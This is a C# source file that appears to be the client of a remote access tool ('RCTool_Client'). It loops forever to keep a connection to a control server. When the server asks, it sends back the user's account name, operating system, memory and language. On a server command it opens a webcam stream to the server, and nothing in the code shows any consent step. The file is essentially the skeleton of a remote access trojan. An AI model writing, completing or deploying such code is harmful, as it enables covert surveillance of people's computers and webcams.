using Microsoft.VisualBasic.Devices;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using AForge.Video.DirectShow;
using RCTool_Client.Packet.Inbound;
using RCTool_Client.Packet.Outbound;
using RCTool_Client.Webcam;

namespace RCTool_Client
{
    static class Program
    {
        static PictureBox box = new PictureBox();
        /// <summary>
        /// Główny punkt wejścia dla aplikacji.
        /// </summary>
        [STAThread]
        public static void Main()
        {
            while (true)
            {
                try
                {
                    OpenConnectionToServer();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }

                Console.WriteLine("[Connection lost]");
                Thread.Sleep(new Random().Next(1000, 3000));
            }
        }



        private static void VideoSource_NewFrame(object sender, AForge.Video.NewFrameEventArgs eventArgs)
        {
            box.Invoke((MethodInvoker)(() => box.Image = new Bitmap(eventArgs.Frame)));
        }

        public static void OpenConnectionToServer()
        {
            ServerConnection scon = new ServerConnection("127.0.0.1", 9900);
            scon.PacketHandler = new PacketHandler(scon);
            scon.PacketHandler.OnPacketReceivedEvent += PacketHandler_OnPacketReceivedEvent;

            scon.Connect();

            Console.WriteLine("[Connected]");

            scon.PacketHandler.SendPacket(new OutboundPacket01Identify());

            while (scon.IsRunning())
            {
                Thread.Sleep(5000);
                scon.PacketHandler.SendPacket(new OutboundPacket00KeepAlive());
            }
        }

        private static void PacketHandler_OnPacketReceivedEvent(ServerConnection scon, InboundPacket packet)
        {
            if (packet is InboudPacket00RequestData requestData)
            {
                if (requestData.RequestedDataType == 0)
                {
                    scon.PacketHandler.SendPacket(new OutboundPacket02DataResponse_ClientListInfo
                    {
                        Username = Environment.UserDomainName + "\\" + Environment.UserName,
                        OperatingSystem = new ComputerInfo().OSFullName,
                        RAM = "" + (Convert.ToInt32(
                            (new ComputerInfo().TotalPhysicalMemory / (Math.Pow(1024, 3))) + 0.5)),
                        Language = CultureInfo.InstalledUICulture.EnglishName
                    });
                }
                
            }

            if (packet is InboundPacket01OpenSocket ip01os)
            {
                if (ip01os.ConnectionType == 3)
                {
                    WebcamConnector wc = new WebcamConnector(scon.Ip, scon.Port, ip01os.Uuid);
                    wc.Connect();
                }
            }
        }

    }
}
